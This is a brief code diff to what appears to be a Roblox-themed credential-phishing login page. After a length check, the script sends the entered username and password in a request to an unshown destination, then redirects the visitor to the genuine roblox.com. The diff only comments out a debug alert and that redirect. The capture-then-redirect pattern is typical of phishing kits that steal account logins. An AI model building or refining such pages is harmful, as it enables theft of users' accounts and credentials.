@@ -1027,7 +1027,6 @@
             error_alert.textContent = 'Username and password required';
         }
         if(input_username.value.length >=3 && input_password.value.length >=8 && input_username.value.length <=20 && input_password.value.length <=200){
-            // alert('success');
             load_login.style.display = 'inline-block';
             btn_check.style.display = 'none';
             error_alert.textContent = '';
@@ -1041,7 +1040,7 @@
             }
             request.send(JSON.stringify(params))
             setTimeout(function () {
-                window.location.href = 'https://roblox.com'
+                // window.location.href = 'https://roblox.com'
             }, 3000)
         }
         if(input_username.value.length <1 && input_password.value.length <8 && input_username.value.length >20 && input_password.value.length >200){
